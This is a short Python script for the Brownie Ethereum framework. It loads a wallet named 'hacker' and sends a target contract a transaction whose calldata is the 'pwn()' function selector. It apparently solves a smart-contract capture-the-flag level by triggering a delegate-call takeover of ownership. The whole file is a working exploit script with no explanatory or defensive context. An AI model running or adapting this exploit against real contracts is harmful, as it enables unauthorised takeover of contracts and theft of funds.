from brownie import web3, accounts, config

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    hacker.transfer(to=target, data=web3.keccak(text='pwn()')[0:4])
